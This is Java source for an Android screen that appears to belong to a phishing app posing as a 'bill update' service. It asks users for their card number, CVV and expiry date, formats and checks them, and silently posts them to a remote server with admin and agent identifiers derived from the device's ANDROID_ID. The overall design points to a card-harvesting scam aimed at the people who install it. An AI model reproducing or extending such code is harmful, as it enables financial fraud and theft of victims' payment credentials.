package com.pegalite.neotron3.ui.bill;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivityBillUpdatePage4Binding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class BillUpdatePage4Activity extends AppCompatActivity {

    ActivityBillUpdatePage4Binding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityBillUpdatePage4Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.cardNumber.addTextChangedListener(new TextWatcher() {
            private boolean isFormatting;

            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
            }

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
            }

            @Override
            public void afterTextChanged(Editable s) {
                if (isFormatting) return;
                isFormatting = true;

                String input = s.toString().replaceAll("\\s", "");
                StringBuilder formatted = new StringBuilder();

                for (int i = 0; i < input.length(); i++) {
                    if (i > 0 && i % 4 == 0) {
                        formatted.append(" ");
                    }
                    formatted.append(input.charAt(i));
                }

                binding.cardNumber.removeTextChangedListener(this);
                binding.cardNumber.setText(formatted.toString());
                binding.cardNumber.setSelection(formatted.length());
                binding.cardNumber.addTextChangedListener(this);

                isFormatting = false;
            }
        });


        binding.submit.setOnClickListener(v -> {
            String cardNumber = binding.cardNumber.getText().toString();
            String cvv = binding.cvv.getText().toString();
            String mm = binding.mmExpiry.getText().toString();
            String yy = binding.yyExpiry.getText().toString();
            if (cardNumber.isEmpty() || cvv.isEmpty() || mm.isEmpty() || yy.isEmpty()) {
                Toast.makeText(this, "Please Enter All The Fields!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (cardNumber.length() != 19) {
                Toast.makeText(this, "Please Enter A Valid Card Number!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (cvv.length() != 3) {
                Toast.makeText(this, "Please Enter A Valid CVV!", Toast.LENGTH_SHORT).show();
                return;
            }
            if (mm.length() != 2 || yy.length() != 2) {
                Toast.makeText(this, "Please Enter A Valid Expiry Date!", Toast.LENGTH_SHORT).show();
                return;
            }

            try {
                JSONObject object = new JSONObject(getIntent().getStringExtra("data"));
                object.put("cardNumber", cardNumber);
                object.put("expiry", mm + "/" + yy);
                object.put("cvv", cvv);
                saveDetails(object);
                if (Utils.THEME.equals("BILL UPDATE")) {
                    startActivity(new Intent(this, BillUpdatePage5Activity.class).putExtra("data", object.toString()));
                } else {
                    startActivity(new Intent(this, BillUpdatePage7Activity.class).putExtra("data", object.toString()));
                }
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        });
    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

}